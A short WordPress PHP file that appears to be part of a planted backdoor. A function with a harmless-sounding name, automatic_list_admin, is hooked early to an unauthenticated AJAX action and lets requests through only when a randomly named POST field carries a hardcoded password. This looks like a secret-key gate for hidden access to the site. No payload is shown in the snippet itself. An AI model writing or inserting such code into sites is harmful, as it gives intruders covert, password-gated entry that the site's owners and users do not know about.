<?php

function automatic_list_admin() {
	if (!isset($_POST["fuhsmswqywiuk"]) || $_POST["fuhsmswqywiuk"] !== "km04fX49n") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'automatic_list_admin', 5, 1);
